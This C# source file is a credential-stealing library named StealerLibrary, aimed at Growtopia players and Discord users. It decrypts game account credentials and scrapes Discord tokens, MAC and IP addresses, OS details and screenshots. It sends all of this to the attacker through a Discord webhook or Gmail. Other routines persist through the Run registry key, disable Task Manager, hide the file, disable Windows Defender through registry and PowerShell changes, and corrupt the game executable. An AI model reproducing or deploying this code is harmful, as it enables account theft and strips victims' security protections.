using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

/* 
       │ Author       : extatent
       │ Name         : StealerLibrary
       │ GitHub       : https://github.com/extatent
*/

namespace StealerLibrary
{
    public class Library
    {
        #region Configuration
        public static string DiscordWebhookUrl { get; set; }
        public static string WebhookName { get; set; }
        public static string WebhookProfilePictureUrl { get; set; }
        public static string Gmail { get; set; }
        public static string GmailPassword { get; set; }
        public static string SMTPServer { get; set; }
        public static int SMTPPort { get; set; }
        #endregion

        #region Discord Stealer
        public static void DiscordStealer(bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
        {
            try
            {
                DeleteTempFiles();
                GetGrowIDPass();
                string LastWorld = GetLastWorld(SaveDatPath());
                string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                string IPAddress = GetIPAddress();
                string GetToken = DiscordToken();
                string OSInfo = OSInformation();
                string Culture = CultureInfo.CurrentCulture.EnglishName;
                string GetCountry = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
                string screen = Path.GetTempPath() + "screen.jpg";
                string MACAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();

                Webhook hook = new Webhook(DiscordWebhookUrl);
                hook.Name = WebhookName;
                hook.ProfilePictureUrl = WebhookProfilePictureUrl;
                string details;
                details = "GrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;

                if (LastWorldBool)
                {
                    details += "Last World: " + LastWorld + Environment.NewLine;
                }
                if (MACAddressBool)
                {
                    details += "MAC Address: " + MACAddress + Environment.NewLine;
                }
                if (IPAddressBool)
                {
                    details += "IP Address: " + IPAddress + Environment.NewLine;
                }
                if (Token)
                {
                    details += "Discord Token: " + GetToken + Environment.NewLine;
                }
                if (Username)
                {
                    details += "User Name: " + Environment.UserName + Environment.NewLine;
                }
                if (PCName)
                {
                    details += "Machine Name: " + Environment.MachineName + Environment.NewLine;
                }
                if (OSInformationBool)
                {
                    details += "OS Information: " + OSInfo + Environment.NewLine;
                }
                if (CountryBool)
                {
                    details += "Country: " + GetCountry + " / " + Culture + Environment.NewLine;
                }
                if (Screenshot)
                {
                    TakeScreenshot();
                    details += "Desktop Screenshot:";
                    hook.SendMessage(details, screen);
                    DeleteTempFiles();
                    return;
                }
                hook.SendMessage(details);
                DeleteTempFiles();
            }
            catch
            {
            }
        }
        #endregion

        #region Gmail Stealer
        public static void GmailStealer(bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
        {
            try
            {
                DeleteTempFiles();
                GetGrowIDPass();
                string LastWorld = GetLastWorld(SaveDatPath());
                string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                string IPAddress = GetIPAddress();
                string GetToken = DiscordToken();
                string OSInfo = OSInformation();
                string Culture = CultureInfo.CurrentCulture.EnglishName;
                string GetCountry = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
                string screen = Path.GetTempPath() + "screen.jpg";
                string MACAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();

                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient(SMTPServer, SMTPPort);
                smtp.Credentials = new NetworkCredential(Gmail, GmailPassword);
                smtp.EnableSsl = true;
                mail.From = new MailAddress(Gmail);
                mail.To.Add(Gmail);
                mail.IsBodyHtml = false;
                mail.Subject = "StealerLibrary";
                mail.Body = "GrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
                if (LastWorldBool)
                {
                    mail.Body += "Last World: " + LastWorld + Environment.NewLine;
                }
                if (MACAddressBool)
                {
                    mail.Body += "MAC Address: " + MACAddress + Environment.NewLine;
                }
                if (IPAddressBool)
                {
                    mail.Body += "IP Address: " + IPAddress + Environment.NewLine;
                }
                if (Token)
                {
                    mail.Body += "Discord Token: " + GetToken + Environment.NewLine;
                }
                if (Username)
                {
                    mail.Body += "User Name: " + Environment.UserName + Environment.NewLine;
                }
                if (PCName)
                {
                    mail.Body += "Machine Name: " + Environment.MachineName + Environment.NewLine;
                }
                if (OSInformationBool)
                {
                    mail.Body += "OS Information: " + OSInfo + Environment.NewLine;
                }
                if (CountryBool)
                {
                    mail.Body += "Country: " + GetCountry + " / " + Culture + Environment.NewLine;
                }
                if (Screenshot)
                {
                    TakeScreenshot();
                    mail.Body += "Desktop Screenshot:";
                    Attachment attachment;
                    attachment = new Attachment(screen);
                    mail.Attachments.Add(attachment);
                    smtp.Send(mail);
                    DeleteTempFiles();
                    return;
                }
                smtp.Send(mail);
                DeleteTempFiles();
            }
            catch
            {
            }
        }
        #endregion

        #region Functions
        public static void Functions(bool RunOnStartup, bool DisableTaskManager, bool CorruptGrowtopia, bool HideStealer, bool DisableWinDefender)
        {
            try
            {
                if (RunOnStartup)
                {
                    try
                    {
                        RegistryKey Run = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        Run.SetValue("Updater", Application.ExecutablePath);
                    }
                    catch
                    { }
                }
                if (DisableTaskManager)
                {
                    try
                    {
                        RegistryKey Reg = null;
                        if (Environment.Is64BitOperatingSystem)
                        {
                            Reg = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
                        }
                        else
                        {
                            Reg = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
                        }
                        RegistryKey TaskMgr = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

                        if (TaskMgr.GetValueNames().Contains("DisableTaskMgr"))
                        {
                            TaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        }
                        TaskMgr.Close();
                    }
                    catch
                    { }
                }
                if (CorruptGrowtopia)
                {
                    try
                    {
                        RegistryKey Reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Growtopia");
                        bool boolean = Reg != null;
                        string Path;
                        if (boolean)
                        {
                            Path = Reg.GetValue("path").ToString();
                            byte[] Array = File.ReadAllBytes(Path + "\\Growtopia.exe");
                            string Bytes = Encoding.Default.GetString(Array);
                            Bytes = Bytes.Replace("growtopia1.com", RandomString(14)).Replace("growtopia2.com", RandomString(14));
                            File.WriteAllBytes(Path + "\\Growtopia.exe", Encoding.Default.GetBytes(Bytes));
                        }
                    }
                    catch
                    { }
                }
                if (HideStealer)
                {
                    try
                    {
                        File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch
                    { }
                }
                if (DisableWinDefender)
                {
                    try
                    {
                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
                        RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
                        CheckDefender();
                    }
                    catch
                    { }
                }
            }
            catch
            {
            }
        }
        #endregion

        #region Trace Save.dat
        public static void TraceSaveDat(bool Discord, bool Gmail)
        {
            if (Discord)
            {
                TraceDiscord();
            }
            if (Gmail)
            {
                TraceGmail();
            }
        }
        #endregion

        #region Trace Save.dat (Discord Webhook)
        static string GTDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", lib;
        static string GTSaveDat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
        static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        static void SendDC()
        {
            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
            if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
            {
                lib = GrowID + Password;
                Webhook hook = new Webhook(DiscordWebhookUrl);
                hook.Name = WebhookName;
                hook.ProfilePictureUrl = WebhookProfilePictureUrl;
                string details;
                details = "Account GrowID or Password was changed.\nGrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
                hook.SendMessage(details);
            }
        }

        static void TraceDiscord()
        {
            GetGrowIDPass();
            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");

            fileSystemWatcher.Path = GTDirectory;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += DCTracer;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        private static void DCTracer(object source, FileSystemEventArgs e)
        {
            if (e.FullPath == GTSaveDat)
            {
                try
                {
                    GetGrowIDPass();
                    string LastWorld = GetLastWorld(SaveDatPath());
                    string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                    string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                    fileSystemWatcher.EnableRaisingEvents = false;
                    if (lib != GrowID + Password)
                    {
                        lib = GrowID + Password;
                        if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
                        {
                            SendDC();
                        }
                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
        #endregion

        #region Trace Save.dat (Gmail)
        static FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
        static void SendGmail()
        {
            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
            if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
            {
                lib = GrowID + Password;
                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient(SMTPServer, SMTPPort);
                smtp.Credentials = new NetworkCredential(Gmail, GmailPassword);
                smtp.EnableSsl = true;
                mail.From = new MailAddress(Gmail);
                mail.To.Add(Gmail);
                mail.IsBodyHtml = false;
                mail.Subject = "StealerLibrary";
                mail.Body = "Account GrowID or Password was changed.\nGrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
                smtp.Send(mail);
            }
        }

        static void TraceGmail()
        {
            GetGrowIDPass();
            string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
            string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");

            fileSystemWatcher2.Path = GTDirectory;
            fileSystemWatcher2.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher2.Filter = "*.dat";
            fileSystemWatcher2.Changed += GmailTracer;
            fileSystemWatcher2.EnableRaisingEvents = true;
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        private static void GmailTracer(object source, FileSystemEventArgs e)
        {
            if (e.FullPath == GTSaveDat)
            {
                try
                {
                    GetGrowIDPass();
                    string LastWorld = GetLastWorld(SaveDatPath());
                    string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                    string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                    fileSystemWatcher2.EnableRaisingEvents = false;
                    if (lib != GrowID + Password)
                    {
                        lib = GrowID + Password;
                        if (!string.IsNullOrEmpty(GrowID) || !string.IsNullOrEmpty(Password))
                        {
                            SendGmail();
                        }
                    }
                }
                finally
                {
                    fileSystemWatcher2.EnableRaisingEvents = true;
                }
            }
        }
        #endregion

        #region Disable Windows Defender
        //https://github.com/NYAN-x-CAT/Disable-Windows-Defender
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        #endregion

        #region Random String
        private static Random random = new Random();
        static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        #endregion

        #region Delete Temp Files
        static void DeleteTempFiles()
        {
            try { File.Delete(Path.GetTempPath() + @"\logfile.txt"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\log.txt"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\savedec.exe"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\screen.jpg"); } catch { }
        }
        #endregion

        #region Take Screenshot
        static void TakeScreenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save(Path.GetTempPath() + "screen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
            }
        }
        #endregion

        #region Get IP Address
        static string GetIPAddress()
        {
            try
            {
                return new WebClient().DownloadString("http://icanhazip.com").Trim();
            }
            catch
            {
                return "N/A";
            }
        }
        #endregion

        #region Get GrowID and Password
        static void GetGrowIDPass()
        {
            try
            {
                if (File.Exists(SaveDatPath()))
                {
                    File.WriteAllBytes(Path.GetTempPath() + "savedec.exe", Resource1.savedec);
                    Process savedec = new Process();
                    savedec.StartInfo.FileName = Path.GetTempPath() + "\\savedec.exe";
                    savedec.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    savedec.Start();
                    savedec.WaitForExit();
                }
            }
            catch
            {
            }
        }
        #endregion

        #region Save.dat Path
        static string SaveDatPath()
        {
            string SaveDatPath;
            try
            {
                RegistryKey Registry;
                if (Environment.Is64BitOperatingSystem)
                {
                    Registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    Registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                Registry = Registry.OpenSubKey("Software\\Growtopia", true);
                string path = (string)Registry.GetValue("path");
                if (Directory.Exists(path))
                {
                    string SaveDat = File.ReadAllText(path + "\\save.dat");
                    if (SaveDat.Contains("tankid_password") && SaveDat.Contains("tankid_name"))
                    {
                        SaveDatPath = path + "\\save.dat";
                        return SaveDatPath;
                    }
                    else
                    {
                        SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                        return SaveDatPath;
                    }
                }
                else
                {
                    SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                    return SaveDatPath;
                }
            }
            catch
            {
                SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                return SaveDatPath;
            }
        }
        #endregion

        #region Get Last World
        static string GetLastWorld(string path)
        {
            try
            {
                byte[] Array = File.ReadAllBytes(path);
                string GetString = Encoding.ASCII.GetString(Array);
                string LastWorld;
                try
                {
                    string text = GetString.Substring(GetString.IndexOf("lastworld") + 13, Convert.ToInt32(Array[GetString.IndexOf("lastworld") + 9]));
                    LastWorld = text;
                }
                catch
                {
                    LastWorld = "N/A";
                }
                return LastWorld;
            }
            catch
            {
                string LastWorld = "N/A";
                return LastWorld;
            }
        }
        #endregion

        #region Discord Webhook Class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public string Name { get; set; }
            public string ProfilePictureUrl { get; set; }

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");
                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "screen.jpg", "screen.jpg");

                }
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Get Discord Token
        static string DiscordToken()
        {
            string result;
            try
            {
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!dotldb(ref text))
                {
                    dotlog(ref text);
                }
                Thread.Sleep(100);
                string text2 = tokenx(text, text.EndsWith(".log"));
                if (text2 == "")
                {
                    text2 = "N/A";
                }
                result = text2;
            }
            catch
            {
                result = "N/A";
            }
            return result;
        }
        private static bool dotldb(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {

                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".ldb");
                        }
                    }
                    result = stringx.EndsWith(".ldb");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            string result;
            try
            {
                if (stringx.Contains(".log"))
                {
                    stringx = Path.GetDirectoryName(stringx) + "\\LogCopy.txt";
                }
                byte[] bytes = File.ReadAllBytes(stringx);
                string @string = Encoding.UTF8.GetString(bytes);
                string text = "";
                string text2 = @string;
                while (text2.Contains("oken"))
                {
                    string[] array = IndexOf(text2).Split(new char[]
                    {
                        '"'
                    });
                    text = array[0];
                    text2 = string.Join("\"", array);
                    if (boolx && text.Length == 59)
                    {
                        break;
                    }
                }
                result = text;
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
            }
            catch
            {
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
                result = "";
            }
            return result;
        }
        static string dotlog(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        bool LogText = ReadLogFile(fileInfo.FullName);
                        if (fileInfo.Name.EndsWith(".log") && LogText)
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".log").ToString();
                        }
                    }
                    result = stringx.EndsWith(".log");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result.ToString();
        }
        static bool ReadLogFile(string path)
        {
            string newpath = Path.GetDirectoryName(path) + "\\LogCopy.txt";
            File.Copy(path, newpath, true);
            bool Result = File.ReadAllText(newpath).Contains("oken");
            return Result;
        }
        private static string IndexOf(string stringx)
        {
            string result;
            try
            {
                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
                {
                    '"'
                });
                List<string> list = new List<string>();
                list.AddRange(array);
                list.RemoveAt(0);
                array = list.ToArray();
                result = string.Join("\"", array);
            }
            catch
            {
                result = null;
            }
            return result;
        }
        #endregion

        #region OS Information
        static string OSInformation()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
            foreach (ManagementObject wmi in searcher.Get())
            {
                try
                {
                    return ((string)wmi["Caption"]).Trim() + ", " + (string)wmi["Version"] + ", " + (string)wmi["OSArchitecture"];
                }
                catch { }
            }
            return "N/A";
        }
        #endregion
    }
}
